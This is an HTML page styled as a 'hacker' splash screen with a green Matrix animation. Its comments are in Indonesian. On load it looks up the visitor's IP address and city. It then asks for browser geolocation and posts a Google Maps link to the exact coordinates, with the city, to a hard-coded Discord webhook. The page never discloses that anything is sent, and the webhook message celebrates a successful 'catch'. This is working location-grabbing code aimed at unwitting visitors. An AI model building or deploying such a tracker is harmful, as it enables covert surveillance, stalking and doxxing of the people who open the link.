<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basakencana Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        
        /* Matriks sebagai background utama */
        #matrix {
            position: fixed;
            top: 0;
            left: 0;
            display: block;
            z-index: 0; /* Paling belakang */
        }

        #info {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
            background: rgba(0, 0, 0, 0.8);
            color: #0F0;
            padding: 20px;
            border: 1px solid #0F0;
            border-radius: 5px;
            width: 280px;
            text-align: center;
            font-family: monospace;
            pointer-events: none; /* Biar tidak ganggu klik */
        }

        #map { height: 150px; width: 100%; margin-top: 10px; border: 1px solid #0F0; }
    </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div id="info">
    <h3 style="margin:0;">BASAKENCANA CORE</h3>
    <p id="status" style="font-size:12px;">INITIALIZING...</p>
    <p id="ip" style="font-size:12px; margin:5px 0;"></p>
    <div id="map"></div>
</div>

<script>
// --- 1. SETTING MATRIKS (JALAN DULUAN) ---
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

function setupCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
setupCanvas();
window.addEventListener('resize', setupCanvas);

const letters = "0101010101".split("");
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = [];
for (let i = 0; i < columns; i++) drops[i] = 1;

function drawMatrix() {
    // Efek luntur (hitam transparan)
    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = "#0F0"; // Warna hijau terang
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
// Jalankan animasi 30 frame per detik
setInterval(drawMatrix, 40);

// --- 2. SISTEM DISCORD & TRACKER ---
const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";

async function track() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        
        document.getElementById('status').innerText = "CONNECTION ESTABLISHED";
        document.getElementById('ip').innerText = "ID: " + data.ip;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                var map = L.map('map').setView([lat, lon], 13);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                L.marker([lat, lon]).addTo(map);

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `✅ **Hujan Berhasil!**\n📍 Lokasi: ${data.city}\n🔗 Maps: ${mLink}`
                    })
                });
            });
        }
    } catch (e) { console.log("Error tracker:", e); }
}

// Jalankan pelacak 1 detik setelah matriks muncul
setTimeout(track, 1000);
</script>
</body>
</html>
